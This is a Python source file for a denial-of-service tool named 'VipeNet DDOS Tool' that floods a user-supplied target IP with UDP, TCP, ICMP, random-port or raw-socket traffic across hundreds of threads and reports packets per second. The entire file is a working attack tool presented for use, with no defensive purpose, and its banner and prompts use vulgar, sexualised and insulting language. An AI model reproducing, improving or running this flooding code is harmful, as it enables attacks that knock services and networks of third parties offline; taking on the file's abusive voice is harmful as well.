import socket
import threading
import random
import time
import os
import sys
import subprocess
from datetime import datetime


# ==================== UI FUNCTIONS ======================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(r'''
██╗   ██╗██╗██████╗ ███████╗███╗   ██╗███████╗████████╗███████╗██████╗ 
██║   ██║██║██╔══██╗██╔════╝████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██║   ██║██║██████╔╝█████╗  ██╔██╗ ██║█████╗     ██║   █████╗  ██████╔╝
██║   ██║██║██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██╔══██╗
╚██████╔╝██║██║     ███████╗██║ ╚████║███████╗   ██║   ███████╗██║  ██║
 ╚═════╝ ╚═╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

💥 VipeNet DDOS Tool — Ultimate Net RAPER (Please run this as Administrator so it can send raw packets!!) 🔥
''')

def startup_animation():
    stages = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]",
              "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    for stage in stages:
        sys.stdout.write(f"\r⚡ Setting up flood engine {stage}")
        sys.stdout.flush()
        time.sleep(0.1)
    print("\n✅ All systems ready.")

# ==================== ATTACK FUNCTIONS ======================
def udp_flood(ip, port, size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(size)
    sock.sendto(data, (ip, port))

def tcp_flood(ip, port, size):
    data = random._urandom(size)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        s.connect((ip, port))
        s.send(data)
        s.close()
    except:
        pass

def icmp_flood(ip, size):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        payload = b'\x08\x00' + os.urandom(size - 2)
        sock.sendto(payload, (ip, 0))
    except:
        pass

def random_port_flood(ip, size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(size)
    rand_port = random.randint(1, 65535)
    sock.sendto(data, (ip, rand_port))

def spoofed_flood(ip, port, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        payload = random._urandom(size)
        s.sendto(payload, (ip, port))
    except:
        pass

# ==================== COUNTERS ====================
packets_sent = 0

def tracked_flood(flood_func):
    global packets_sent
    while True:
        try:
            flood_func()
            packets_sent += 1
        except:
            pass

def pps_counter():
    global packets_sent
    startup_animation()
    print("\n⏳ Initializing threads... please wait you skid..\n")
    while packets_sent == 0:
        time.sleep(0.1)
    print("✅ Flooding has begun.\n")
    while True:
        before = packets_sent
        time.sleep(1)
        after = packets_sent
        print(f"\033[95m🔥 PPS: {after - before} | Total Sent: {packets_sent:,} | Time: {datetime.now().strftime('%H:%M:%S')}\033[0m", end='\r', flush=True)

# ==================== PING TEST ====================
def ping_test(ip):
    print(f"\n🔎 Pinging {ip} to see if it's alive...")
    param = '-n' if os.name == 'nt' else '-c'
    command = ['ping', param, '2', ip]
    result = subprocess.run(command, stdout=subprocess.DEVNULL)
    if result.returncode != 0:
        print(f"❌ No response from {ip} sadly. Might be down or blocking pings.")
        confirm = input("Run anyway? (y/n): ").strip().lower()
        if confirm != 'y':
            print("Abortioned.")
            sys.exit()
    else:
        print("✅ Target looks reachable.")

# ==================== MAIN ====================
def main():
    clear()
    banner()
    print("\nFlooder locked. Time to cause problems. YIPEEE\n")

    ip = input("🧠 Target IP: ").strip()
    ping_test(ip)
    port = input("🔌 Port (leave blank for ICMP/Spoofed): ").strip()
    port = int(port) if port else 0

    print("\n💣 Pick your mode:")
    print("  [1] UDP")
    print("  [2] TCP")
    print("  [3] ICMP")
    print("  [4] Random Ports")
    print("  [5] Spoofed")
    mode = input("👉 Mode (1-5): ").strip()

    print("\n📦 Packet Size:")
    print("  512 = chill")
    print("  1024 = clean")
    print("  1400+ = chaos")
    packet_size = int(input("Size (bytes): ").strip())

    print("\n🧵 Threads:")
    print("  300 = lowkey")
    print("  600+ = mid")
    print("  1000+ = overkill")
    thread_count = int(input("Threads: ").strip())

    log = input("\n📜 Log this run? (y/n): ").strip().lower() == 'y'
    logfile = open("vipenet.log", "a") if log else None

    if mode == '1':
        func = lambda: udp_flood(ip, port, packet_size)
    elif mode == '2':
        func = lambda: tcp_flood(ip, port, packet_size)
    elif mode == '3':
        func = lambda: icmp_flood(ip, packet_size)
    elif mode == '4':
        func = lambda: random_port_flood(ip, packet_size)
    elif mode == '5':
        func = lambda: spoofed_flood(ip, port, packet_size)
    else:
        print("❌ Nah, that mode ain't valid. Choose another one dumbass")
        sys.exit()

    print("\n🚀 Starting raper:")
    print(f"   🌐 IP: {ip}")
    print(f"   🔁 Port: {port}")
    print(f"   🧨 Threads: {thread_count}")
    print(f"   📦 Packet Size: {packet_size}")
    print(f"   🔥 Mode: {mode}\n")

    if logfile:
        logfile.write(f"[{datetime.now()}] STARTED: {ip}:{port} | Mode {mode} | Threads: {thread_count} | Size: {packet_size}\n")

    for _ in range(thread_count):
        threading.Thread(target=tracked_flood, args=(func,), daemon=True).start()

    threading.Thread(target=pps_counter, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n⛔ Shutdown. CYA NEGISH!!")
        if logfile:
            logfile.write(f"[{datetime.now()}] STOPPED.\n")
            logfile.close()

if __name__ == '__main__':
    main()

#fuck all yall